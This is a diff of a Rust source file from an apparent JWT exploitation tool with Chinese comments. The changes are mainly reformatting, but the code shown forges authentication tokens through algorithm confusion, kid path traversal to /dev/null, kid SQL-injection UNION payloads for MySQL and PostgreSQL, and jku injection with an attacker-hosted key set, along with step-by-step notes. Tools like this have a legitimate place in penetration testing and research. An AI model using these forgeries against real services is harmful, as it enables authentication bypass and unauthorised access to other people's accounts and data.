@@ -1,6 +1,7 @@
 use crate::analyzer::parse_jwt;
-use crate::bruteforce::{forge_token, forge_none_token};
+use crate::bruteforce::{forge_none_token, forge_token};
 use anyhow::Result;
+use hmac::KeyInit;
 use serde_json::Value;
 
 pub struct ExploitResult {
@@ -53,7 +54,8 @@ pub fn exploit_algorithm_confusion(
         vuln_id: "JWT-003".to_string(),
         description: "算法混淆攻击：将非对称算法改为HS256，用公钥内容作为HMAC密钥".to_string(),
         forged_tokens: vec![("HS256 with public key".to_string(), forged)],
-        notes: "需先获取服务端公钥（常见路径：/.well-known/jwks.json, /api/auth/public-key）".to_string(),
+        notes: "需先获取服务端公钥（常见路径：/.well-known/jwks.json, /api/auth/public-key）"
+            .to_string(),
     })
 }
 
@@ -82,14 +84,18 @@ pub fn exploit_kid_traversal(token: &str, secret: &str) -> Result<ExploitResult>
         // 用空字符串或提供的secret签名（/dev/null对应空文件）
         let use_secret = if label.contains("null") { "" } else { secret };
         let sig = hmac_sign(&parsed.header.alg, &signing_input, use_secret);
-        forged_tokens.push((label.to_string(), format!("{}.{}.{}", header_b64, payload_b64, sig)));
+        forged_tokens.push((
+            label.to_string(),
+            format!("{}.{}.{}", header_b64, payload_b64, sig),
+        ));
     }
 
     Ok(ExploitResult {
         vuln_id: "JWT-004".to_string(),
         description: "kid路径遍历攻击：使用路径遍历payload让服务端读取可控文件作为密钥".to_string(),
         forged_tokens,
-        notes: "当kid指向/dev/null时，文件内容为空，secret=''; 需要服务端存在路径遍历漏洞".to_string(),
+        notes: "当kid指向/dev/null时，文件内容为空，secret=''; 需要服务端存在路径遍历漏洞"
+            .to_string(),
     })
 }
 
@@ -101,15 +107,21 @@ pub fn exploit_kid_sqli(token: &str, db_type: &str) -> Result<ExploitResult> {
     let sql_payloads: Vec<(&str, &str, &str)> = match db_type.to_lowercase().as_str() {
         "mysql" => vec![
             ("MySQL UNION(空secret)", "' UNION SELECT '' -- -", ""),
-            ("MySQL UNION(已知secret)", "' UNION SELECT 'mysecret' -- -", "mysecret"),
+            (
+                "MySQL UNION(已知secret)",
+                "' UNION SELECT 'mysecret' -- -",
+                "mysecret",
+            ),
         ],
         "postgres" | "postgresql" => vec![
             ("PG UNION(空secret)", "' UNION SELECT '' -- -", ""),
-            ("PG UNION(已知secret)", "' UNION SELECT 'mysecret' -- -", "mysecret"),
+            (
+                "PG UNION(已知secret)",
+                "' UNION SELECT 'mysecret' -- -",
+                "mysecret",
+            ),
         ],
-        _ => vec![
-            ("Generic UNION(空secret)", "' UNION SELECT '' -- -", ""),
-        ],
+        _ => vec![("Generic UNION(空secret)", "' UNION SELECT '' -- -", "")],
     };
 
     let mut forged_tokens = Vec::new();
@@ -123,7 +135,10 @@ pub fn exploit_kid_sqli(token: &str, db_type: &str) -> Result<ExploitResult> {
         let payload_b64 = base64url_encode(&serde_json::to_string(&claims)?);
         let signing_input = format!("{}.{}", header_b64, payload_b64);
         let sig = hmac_sign(&parsed.header.alg, &signing_input, secret);
-        forged_tokens.push((label.to_string(), format!("{}.{}.{}", header_b64, payload_b64, sig)));
+        forged_tokens.push((
+            label.to_string(),
+            format!("{}.{}.{}", header_b64, payload_b64, sig),
+        ));
     }
 
     Ok(ExploitResult {
@@ -149,10 +164,13 @@ pub fn exploit_jku_injection(token: &str, attacker_jwks_url: &str) -> Result<Exp
     Ok(ExploitResult {
         vuln_id: "JWT-006".to_string(),
         description: "jku注入：让服务端从攻击者控制的URL加载JWKS公钥".to_string(),
-        forged_tokens: vec![
-            ("jku_injected_header".to_string(),
-             format!("Header(base64url): {}\nPayload: {}\n签名: 需用攻击者私钥生成", header_b64, payload_b64))
-        ],
+        forged_tokens: vec![(
+            "jku_injected_header".to_string(),
+            format!(
+                "Header(base64url): {}\nPayload: {}\n签名: 需用攻击者私钥生成",
+                header_b64, payload_b64
+            ),
+        )],
         notes: format!(
             "步骤：1. 在 {} 托管你的JWKS（含公钥）\n2. 用对应私钥对 {}.{} 签名\n3. 拼装完整token提交",
             attacker_jwks_url, header_b64, payload_b64
@@ -163,7 +181,7 @@ pub fn exploit_jku_injection(token: &str, attacker_jwks_url: &str) -> Result<Exp
 // ---- 内部辅助 ----
 
 fn base64url_encode(s: &str) -> String {
-    use base64::{engine::general_purpose, Engine as _};
+    use base64::{Engine as _, engine::general_purpose};
     general_purpose::STANDARD
         .encode(s.as_bytes())
         .replace('+', "-")
@@ -173,9 +191,9 @@ fn base64url_encode(s: &str) -> String {
 }
 
 fn hmac_sign(alg: &str, signing_input: &str, secret: &str) -> String {
+    use base64::{Engine as _, engine::general_purpose};
     use hmac::{Hmac, Mac};
     use sha2::{Sha256, Sha384, Sha512};
-    use base64::{engine::general_purpose, Engine as _};
 
     fn encode(bytes: &[u8]) -> String {
         general_purpose::STANDARD
